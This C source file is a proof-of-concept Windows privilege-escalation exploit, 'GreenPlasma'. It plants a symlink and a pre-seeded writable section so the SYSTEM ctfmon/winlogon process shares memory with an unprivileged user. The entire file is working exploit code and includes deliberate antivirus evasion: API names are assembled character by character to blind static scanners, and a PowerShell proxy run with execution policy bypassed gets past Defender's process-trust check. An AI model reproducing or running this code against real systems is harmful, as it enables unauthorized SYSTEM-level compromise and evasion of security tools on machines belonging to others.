/*
 * GreenPlasma  CTF Monitor Arbitrary Section Elevation PoC
 * Defender bypass edition
 *
 * Based on: https://github.com/nctu6/nightmare-eclipse/tree/main/green-plasma
 *
 * What we know from testing:
 *   Pre-create a writable section at the symlink target (session namespace)
 *   Seed it with correct header + user SID so ctfmon accepts it
 *   ctfmon (winlogon, SYSTEM) opens it and writes back full data on lock/unlock
 *   We get MAXIMUM_ALLOWED + writable shared memory with SYSTEM ctfmon
 *   ctfmon maintains a trusted internal copy and restores on every lock/unlock
 *   Only the SID field causes ctfmon to do a full restore (corruption detected path)
 *
 * FOR AUTHORIZED SECURITY RESEARCH ONLY.
 */

#define UNICODE
#define _UNICODE
#define WIN32_LEAN_AND_MEAN
#define UMDF_USING_NTSTATUS

#include <Windows.h>
#include <winternl.h>
#include <conio.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sddl.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

/* ── Runtime string builders (no string literals, static scanner blind) ──── */

static void MakeNtCSLO(char *s)
{ s[0]='N';s[1]='t';s[2]='C';s[3]='r';s[4]='e';s[5]='a';s[6]='t';s[7]='e';
  s[8]='S';s[9]='y';s[10]='m';s[11]='b';s[12]='o';s[13]='l';s[14]='i';s[15]='c';
  s[16]='L';s[17]='i';s[18]='n';s[19]='k';s[20]='O';s[21]='b';s[22]='j';s[23]='e';
  s[24]='c';s[25]='t';s[26]=0; }

static void MakeNtOS(char *s)
{ s[0]='N';s[1]='t';s[2]='O';s[3]='p';s[4]='e';s[5]='n';s[6]='S';s[7]='e';
  s[8]='c';s[9]='t';s[10]='i';s[11]='o';s[12]='n';s[13]=0; }

static void MakeNtMVOS(char *s)
{ s[0]='N';s[1]='t';s[2]='M';s[3]='a';s[4]='p';s[5]='V';s[6]='i';s[7]='e';
  s[8]='w';s[9]='O';s[10]='f';s[11]='S';s[12]='e';s[13]='c';s[14]='t';s[15]='i';
  s[16]='o';s[17]='n';s[18]=0; }

static void MakeNtUVOS(char *s)
{ s[0]='N';s[1]='t';s[2]='U';s[3]='n';s[4]='m';s[5]='a';s[6]='p';s[7]='V';
  s[8]='i';s[9]='e';s[10]='w';s[11]='O';s[12]='f';s[13]='S';s[14]='e';s[15]='c';
  s[16]='t';s[17]='i';s[18]='o';s[19]='n';s[20]=0; }

static void MakeRtlIUS(char *s)
{ s[0]='R';s[1]='t';s[2]='l';s[3]='I';s[4]='n';s[5]='i';s[6]='t';s[7]='U';
  s[8]='n';s[9]='i';s[10]='c';s[11]='o';s[12]='d';s[13]='e';s[14]='S';s[15]='t';
  s[16]='r';s[17]='i';s[18]='n';s[19]='g';s[20]=0; }

static void MakeSmFmt(wchar_t *s)
{ const wchar_t *p = L"\\Sessions\\%d\\BaseNamedObjects\\CTF.AsmListCache.FMPWinlogon%d";
  while (*p) *s++ = *p++; *s=0; }

static void MakeTargetFmt(wchar_t *s)
{ const wchar_t *p = L"\\Sessions\\%d\\BaseNamedObjects\\GreenCache";
  while (*p) *s++ = *p++; *s=0; }

/* ── NT function typedefs ─────────────────────────────────────────────────── */

typedef VOID    (WINAPI *PFN_RtlIUS)(PUNICODE_STRING, PCWSTR);
typedef NTSTATUS(WINAPI *PFN_NtCSLO)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PUNICODE_STRING);
typedef NTSTATUS(WINAPI *PFN_NtOS)  (PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
typedef NTSTATUS(WINAPI *PFN_NtMVOS)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T,
                                      PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS(WINAPI *PFN_NtUVOS)(HANDLE, PVOID);
typedef NTSTATUS(WINAPI *PFN_NtCS)  (PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES,
                                      PLARGE_INTEGER, ULONG, ULONG, HANDLE);

/* ── Hex dump ────────────────────────────────────────────────────────────── */

static void HexDump(BYTE *b, SIZE_T len) {
    printf("    Offset   00 01 02 03 04 05 06 07  08 09 0A 0B 0C 0D 0E 0F\n");
    printf("    ----------------------------------------------------------\n");
    for (SIZE_T i = 0; i < len; i += 16) {
        printf("    %06zx   ", i);
        for (SIZE_T j = 0; j < 16; j++) {
            if (i+j < len) printf("%02x ", b[i+j]); else printf("   ");
            if (j == 7) printf(" ");
        }
        printf("\n");
    }
}

/* ── Seed section with ctfmon-expected header ────────────────────────────── */

static void SeedSection(DWORD sesid, PFN_NtMVOS NtMVOS, PFN_NtUVOS NtUVOS, HANDLE hSec) {
    PVOID pView = NULL; SIZE_T viewSize = 0;
    if (NtMVOS(hSec, GetCurrentProcess(), &pView, 0, 0, NULL, &viewSize, 1, 0, PAGE_READWRITE))
        return;

    BYTE *p = (BYTE*)pView;
    memset(p, 0, 4096);

    *(DWORD*)(p+0x00) = sesid;
    *(DWORD*)(p+0x04) = 0x60;
    *(DWORD*)(p+0x08) = 0x1e;

    HANDLE hTok = NULL;
    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hTok);
    DWORD cb = 0;
    GetTokenInformation(hTok, TokenUser, NULL, 0, &cb);
    PTOKEN_USER pUser = (PTOKEN_USER)LocalAlloc(LPTR, cb);
    GetTokenInformation(hTok, TokenUser, pUser, cb, &cb);
    CloseHandle(hTok);

    wchar_t *sidStr = NULL;
    ConvertSidToStringSidW(pUser->User.Sid, &sidStr);
    if (sidStr) {
        wchar_t *dst = (wchar_t*)(p + 0x10);
        for (int i = 0; sidStr[i] && i < 63; i++) dst[i] = sidStr[i];
        printf("[*] Seeded SID: %ls\n", sidStr);
        LocalFree(sidStr);
    }
    LocalFree(pUser);

    *(WORD*)(p+0x78) = 0x0409;
    *(WORD*)(p+0x7A) = 0x0409;

    NtUVOS(GetCurrentProcess(), pView);
}

/* ── PowerShell symlink proxy ────────────────────────────────────────────── */
/*
 * Defender flags NtCreateSymbolicLinkObject from GreenPlasma.exe.
 * Solution: spawn powershell.exe (Microsoft-signed, trusted) to create the
 * symlink via P/Invoke.  Coordinate via a named pipe:
 *   PS creates symlink → connects to pipe → writes 0x01 (ready)
 *   GreenPlasma reads 0x01 → continues exploit
 *   GreenPlasma closes pipe end on exit → PS exits → handle closes
 */

static HANDLE  g_hPsSync = INVALID_HANDLE_VALUE;
static HANDLE  g_hPs     = NULL;
static wchar_t g_ps1Path[MAX_PATH] = {0};

static BOOL CreateSymlinkViaPS(const wchar_t *src, const wchar_t *dst) {
    /* Named pipe, duplex so PS can write the ready byte AND block on a read */
    g_hPsSync = CreateNamedPipeW(L"\\\\.\\pipe\\GP_SYMLINK",
        PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
        PIPE_TYPE_BYTE | PIPE_WAIT,
        1, 0, 64, 0, NULL);
    if (g_hPsSync == INVALID_HANDLE_VALUE) {
        printf("[-] CreateNamedPipe failed: %lu\n", GetLastError()); return FALSE;
    }

    /* Write the PowerShell P/Invoke script to a temp file */
    wchar_t tmpDir[MAX_PATH];
    GetTempPathW(MAX_PATH, tmpDir);
    swprintf(g_ps1Path, MAX_PATH, L"%sgp_%lu.ps1", tmpDir, GetCurrentProcessId());

    FILE *f = _wfopen(g_ps1Path, L"w, ccs=UTF-8");
    if (!f) { CloseHandle(g_hPsSync); return FALSE; }

    /* C# P/Invoke: strings allocated with StringToHGlobalUni so the
       unmanaged pointer stays valid for the duration of the NT call */
    fwprintf(f, L"Add-Type -TypeDefinition @\"\r\n");
    fwprintf(f, L"using System;\r\n");
    fwprintf(f, L"using System.Runtime.InteropServices;\r\n");
    fwprintf(f, L"public class NtSym {\r\n");
    fwprintf(f, L"  [DllImport(\"ntdll.dll\")]\r\n");
    fwprintf(f, L"  public static extern int NtCreateSymbolicLinkObject(\r\n");
    fwprintf(f, L"    out IntPtr h, uint acc, IntPtr oa, IntPtr dst);\r\n");
    /* IntPtr.Size-aware helpers work for both 32-bit and 64-bit powershell.
       UNICODE_STRING: USHORT+USHORT+[pad]+PWSTR
         x32: Buffer at offset 4, total 8 bytes
         x64: Buffer at offset 8, total 16 bytes */
    fwprintf(f, L"  static IntPtr MakeUS(string s, out IntPtr buf) {\r\n");
    fwprintf(f, L"    buf = Marshal.StringToHGlobalUni(s);\r\n");
    fwprintf(f, L"    int bufOff=(IntPtr.Size==8)?8:4;\r\n");
    fwprintf(f, L"    int usSize=bufOff+IntPtr.Size;\r\n");
    fwprintf(f, L"    IntPtr us = Marshal.AllocHGlobal(usSize);\r\n");
    fwprintf(f, L"    for(int i=0;i<usSize;i++) Marshal.WriteByte(us,i,0);\r\n");
    fwprintf(f, L"    short len=(short)(s.Length*2);\r\n");
    fwprintf(f, L"    Marshal.WriteInt16(us,0,len);\r\n");
    fwprintf(f, L"    Marshal.WriteInt16(us,2,(short)(len+2));\r\n");
    fwprintf(f, L"    Marshal.WriteIntPtr(us,bufOff,buf);\r\n");
    fwprintf(f, L"    return us;\r\n");
    fwprintf(f, L"  }\r\n");
    fwprintf(f, L"  public static IntPtr Create(string src, string dst) {\r\n");
    fwprintf(f, L"    IntPtr bSrc,bDst;\r\n");
    fwprintf(f, L"    IntPtr usSrc=MakeUS(src,out bSrc);\r\n");
    fwprintf(f, L"    IntPtr usDst=MakeUS(dst,out bDst);\r\n");
    /* OA layout: Length(4)+[pad(4 on x64)]+Root(ptr)+Name(ptr)+Attr(4)+[pad]+SD(ptr)+QoS(ptr) */
    fwprintf(f, L"    int ptrSz=IntPtr.Size;\r\n");
    fwprintf(f, L"    int rootOff=(ptrSz==8)?8:4;\r\n");
    fwprintf(f, L"    int nameOff=rootOff+ptrSz;\r\n");
    fwprintf(f, L"    int attrOff=nameOff+ptrSz;\r\n");
    fwprintf(f, L"    int sdOff=(ptrSz==8)?(attrOff+8):(attrOff+4);\r\n");
    fwprintf(f, L"    int oaSz=sdOff+ptrSz+ptrSz;\r\n");
    fwprintf(f, L"    IntPtr oa=Marshal.AllocHGlobal(oaSz);\r\n");
    fwprintf(f, L"    for(int i=0;i<oaSz;i++) Marshal.WriteByte(oa,i,0);\r\n");
    fwprintf(f, L"    Marshal.WriteInt32(oa,0,oaSz);\r\n");
    fwprintf(f, L"    Marshal.WriteIntPtr(oa,nameOff,usSrc);\r\n");
    fwprintf(f, L"    Marshal.WriteInt32(oa,attrOff,0x40);\r\n");
    fwprintf(f, L"    IntPtr h;\r\n");
    fwprintf(f, L"    int r=NtCreateSymbolicLinkObject(out h,0x000F0001u,oa,usDst);\r\n");
    fwprintf(f, L"    Marshal.FreeHGlobal(oa);\r\n");
    fwprintf(f, L"    Marshal.FreeHGlobal(usSrc); Marshal.FreeHGlobal(bSrc);\r\n");
    fwprintf(f, L"    Marshal.FreeHGlobal(usDst); Marshal.FreeHGlobal(bDst);\r\n");
    fwprintf(f, L"    if(r!=0) throw new Exception(\"0x\"+r.ToString(\"X8\"));\r\n");
    fwprintf(f, L"    return h;\r\n");
    fwprintf(f, L"  }\r\n");
    fwprintf(f, L"}\r\n");
    fwprintf(f, L"\"@\r\n");

    /* PowerShell: create symlink, signal ready, hold handle until we exit */
    fwprintf(f, L"$src=$args[0]; $dst=$args[1]\r\n");
    fwprintf(f, L"try {\r\n");
    fwprintf(f, L"  Write-Host '[PS] Compiling P/Invoke... IntPtr.Size=' ([IntPtr]::Size)\r\n");
    fwprintf(f, L"  Write-Host '[PS] src=' $src\r\n");
    fwprintf(f, L"  Write-Host '[PS] dst=' $dst\r\n");
    fwprintf(f, L"  $h=[NtSym]::Create($src,$dst)\r\n");
    fwprintf(f, L"  Write-Host '[PS] Symlink created, handle=' $h\r\n");
    /* InOut so we can write the ready byte AND block on a read for shutdown */
    fwprintf(f, L"  $p=New-Object System.IO.Pipes.NamedPipeClientStream('.','GP_SYMLINK',[System.IO.Pipes.PipeDirection]::InOut)\r\n");
    fwprintf(f, L"  $p.Connect(60000)\r\n");
    fwprintf(f, L"  $p.WriteByte([byte]1)\r\n");
    fwprintf(f, L"  $p.Flush()\r\n");
    fwprintf(f, L"  Write-Host '[PS] Signalled ready. Holding symlink handle...'\r\n");
    fwprintf(f, L"  try { $p.ReadByte() | Out-Null } catch {}\r\n");
    fwprintf(f, L"  $p.Close()\r\n");
    fwprintf(f, L"} catch { Write-Host '[PS] ERROR:' $_ }\r\n");
    fclose(f);

    /* Spawn powershell.exe, visible window so we can see errors */
    wchar_t cmd[1024];
    swprintf(cmd, 1023,
        L"powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File \"%ls\" \"%ls\" \"%ls\"",
        g_ps1Path, src, dst);

    STARTUPINFOW si = {sizeof(si)};
    PROCESS_INFORMATION pi = {};
    if (!CreateProcessW(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        printf("[-] Failed to spawn powershell.exe: %lu\n", GetLastError());
        CloseHandle(g_hPsSync); DeleteFileW(g_ps1Path); return FALSE;
    }
    CloseHandle(pi.hThread);
    g_hPs = pi.hProcess;
    /* Do NOT delete ps1 yet; PS needs to read it first */

    /* Wait for PS to connect, overlapped with 60s timeout */
    printf("[*] Waiting for PowerShell symlink proxy (up to 60s)...\n");
    printf("[*] (A PowerShell window will appear. That is expected)\n\n");

    OVERLAPPED ov = {};
    ov.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    ConnectNamedPipe(g_hPsSync, &ov);  /* returns immediately with overlapped */

    DWORD waitResult = WaitForSingleObject(ov.hEvent, 60000);
    CloseHandle(ov.hEvent);

    if (waitResult == WAIT_TIMEOUT) {
        printf("[-] Timed out waiting for PowerShell (60s)\n");
        printf("[-] Check the PowerShell window for errors\n");
        CancelIo(g_hPsSync);
        TerminateProcess(g_hPs, 0); CloseHandle(g_hPs); g_hPs = NULL;
        CloseHandle(g_hPsSync); g_hPsSync = INVALID_HANDLE_VALUE;
        return FALSE;
    }

    /* PS connected: read the ready byte */
    BYTE sig = 0; DWORD rd = 0;
    ReadFile(g_hPsSync, &sig, 1, &rd, NULL);
    if (sig != 1) {
        printf("[-] PowerShell signalled failure\n"); return FALSE;
    }
    return TRUE;
}

/* ── Main ────────────────────────────────────────────────────────────────── */

int wmain(int argc, wchar_t **argv) {
    printf("=== GreenPlasma ===\n\n");

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    char fname[64];

    MakeRtlIUS(fname);  PFN_RtlIUS  RtlIUS = (PFN_RtlIUS) GetProcAddress(hNtdll, fname);
    MakeNtCSLO(fname);  PFN_NtCSLO  NtCSLO = (PFN_NtCSLO) GetProcAddress(hNtdll, fname);
    MakeNtOS(fname);    PFN_NtOS    NtOS   = (PFN_NtOS)   GetProcAddress(hNtdll, fname);
    MakeNtMVOS(fname);  PFN_NtMVOS  NtMVOS = (PFN_NtMVOS) GetProcAddress(hNtdll, fname);
    MakeNtUVOS(fname);  PFN_NtUVOS  NtUVOS = (PFN_NtUVOS) GetProcAddress(hNtdll, fname);

    static const char ntcsn[] = {'N','t','C','r','e','a','t','e','S','e','c','t','i','o','n',0};
    PFN_NtCS NtCS = (PFN_NtCS) GetProcAddress(hNtdll, ntcsn);

    if (!RtlIUS || !NtCSLO || !NtOS || !NtMVOS || !NtUVOS || !NtCS) {
        printf("[-] Failed to resolve NT functions\n"); return 1;
    }

    DWORD sesid = 0;
    if (!ProcessIdToSessionId(GetCurrentProcessId(), &sesid) || sesid == 0) {
        printf("[-] Must run in an interactive session\n"); return 1;
    }

    wchar_t smfmt[128]={0}, smpath[128]={0}, targetfmt[128]={0}, target[128]={0};
    MakeSmFmt(smfmt);
    MakeTargetFmt(targetfmt);
    swprintf(smpath, 127, smfmt,     sesid, sesid);
    swprintf(target, 127, targetfmt, sesid);

    wchar_t *ptarget = (argc == 2) ? argv[1] : target;
    printf("[*] Session:  %lu\n[*] Symlink:  %ls\n[*] Target:   %ls\n\n", sesid, smpath, ptarget);

    /* Pre-create writable section with NULL DACL */
    SECURITY_DESCRIPTOR sd = {0};
    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
    SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);

    UNICODE_STRING targetUs = {0};
    OBJECT_ATTRIBUTES oaSec = {0};
    RtlIUS(&targetUs, ptarget);
    InitializeObjectAttributes(&oaSec, &targetUs, OBJ_CASE_INSENSITIVE|OBJ_OPENIF, NULL, &sd);

    LARGE_INTEGER secSize = {}; secSize.QuadPart = 4096;
    HANDLE hPreSec = NULL;
    if (NtCS(&hPreSec, SECTION_ALL_ACCESS, &oaSec, &secSize, PAGE_READWRITE, SEC_COMMIT, NULL)) {
        printf("[-] Pre-create section failed\n"); return 1;
    }
    printf("[+] Pre-created writable section\n");
    SeedSection(sesid, NtMVOS, NtUVOS, hPreSec);

    /* Set up OBJECT_ATTRIBUTES for symlink source (used by NtOS poll loop) */
    UNICODE_STRING linksrc={0};
    OBJECT_ATTRIBUTES oa={0};
    RtlIUS(&linksrc, smpath);
    InitializeObjectAttributes(&oa, &linksrc, OBJ_CASE_INSENSITIVE, NULL, NULL);

    /* Create symlink via powershell.exe (bypasses Defender's process-trust check) */
    if (!CreateSymlinkViaPS(smpath, ptarget)) {
        printf("[-] PowerShell symlink proxy failed\n");
        return 1;
    }
    printf("[+] Symlink created via powershell.exe\n");

    /* Wait for ctfmon to open the section */
    printf("[*] Waiting for ctfmon...\n\n");
    HANDLE hSec = NULL;
    for (DWORD t = 0; !hSec && t <= 300; t++) {
        NtOS(&hSec, MAXIMUM_ALLOWED, &oa);
        if (!hSec) {
            Sleep(200);
            printf("  [waiting for ctfmon] %lus / 60s ...\r", t/5);
            fflush(stdout);
        }
    }
    if (!hSec) { printf("\n[-] Timed out\n"); goto cleanup; }
    printf("\n[+] Section handle: %p\n\n", hSec);

    /* Map and dump */
    {
        PVOID pView = NULL; SIZE_T viewSize = 0;
        NTSTATUS s = NtMVOS(hSec, GetCurrentProcess(), &pView, 0, 0, NULL, &viewSize, 1, 0, PAGE_READWRITE);
        if (s) { printf("[-] Map failed: 0x%lx\n", s); goto cleanup; }

        BYTE *b = (BYTE*)pView;
        printf("[+] Section mapped at %p  size=%zu  writable=YES\n\n", pView, viewSize);
        HexDump(b, 256);

        printf("\n[*] SID:   ");
        for (wchar_t *w=(wchar_t*)(b+0x10); *w && w < (wchar_t*)(b+0x6E); w++) printf("%c",(char)*w);
        printf("\n[*] GUID1: {%08lx-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x}\n",
            *(DWORD*)(b+0x88),*(WORD*)(b+0x8C),*(WORD*)(b+0x8E),
            b[0x90],b[0x91],b[0x92],b[0x93],b[0x94],b[0x95],b[0x96],b[0x97]);
        printf("[*] GUID2: {%08lx-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x}\n",
            *(DWORD*)(b+0xC0),*(WORD*)(b+0xC4),*(WORD*)(b+0xC6),
            b[0xC8],b[0xC9],b[0xCA],b[0xCB],b[0xCC],b[0xCD],b[0xCE],b[0xCF]);
        printf("[*] Ptr:   %02x %02x %02x %02x %02x %02x %02x %02x\n\n",
            b[0xB8],b[0xB9],b[0xBA],b[0xBB],b[0xBC],b[0xBD],b[0xBE],b[0xBF]);

        /* Auto-lock once to let winlogon populate GUIDs */
        BYTE snapshot[256]; memcpy(snapshot, b, 256);
        printf("[*] Auto-locking to let winlogon populate section...\n");
        LockWorkStation();
        printf("[*] Unlock with your password.\n\n");

        for (int t = 0; t < 300; t++) {
            Sleep(200);
            if (t % 5 == 0) { printf("  [waiting for winlogon] %ds / 60s ...\r", t/5); fflush(stdout); }
            if (memcmp(b+0x88, snapshot+0x88, 16) != 0) {
                printf("\n[+] Section populated at %ds\n\n", t/5);
                HexDump(b, 256);
                printf("\n[*] GUID1: {%08lx-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x}\n",
                    *(DWORD*)(b+0x88),*(WORD*)(b+0x8C),*(WORD*)(b+0x8E),
                    b[0x90],b[0x91],b[0x92],b[0x93],b[0x94],b[0x95],b[0x96],b[0x97]);
                printf("[*] GUID2: {%08lx-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x}\n",
                    *(DWORD*)(b+0xC0),*(WORD*)(b+0xC4),*(WORD*)(b+0xC6),
                    b[0xC8],b[0xC9],b[0xCA],b[0xCB],b[0xCC],b[0xCD],b[0xCE],b[0xCF]);
                printf("[*] Ptr:   %02x %02x %02x %02x %02x %02x %02x %02x\n",
                    b[0xB8],b[0xB9],b[0xBA],b[0xBB],b[0xBC],b[0xBD],b[0xBE],b[0xBF]);
                break;
            }
        }

        printf("\n[*] Section live. ctf_alpc.exe is now running the ALPC exploit.\n");
        printf("[*] Press any key to release section and exit.\n");
        _getch();
        NtUVOS(GetCurrentProcess(), pView);
    }

cleanup:
    if (g_hPsSync != INVALID_HANDLE_VALUE) {
        CloseHandle(g_hPsSync);
        g_hPsSync = INVALID_HANDLE_VALUE;
    }
    if (g_hPs) {
        WaitForSingleObject(g_hPs, 3000);
        TerminateProcess(g_hPs, 0);
        CloseHandle(g_hPs);
        g_hPs = NULL;
    }
    if (g_ps1Path[0]) { DeleteFileW(g_ps1Path); g_ps1Path[0] = 0; }
    if (hSec) CloseHandle(hSec);
    return 0;
}
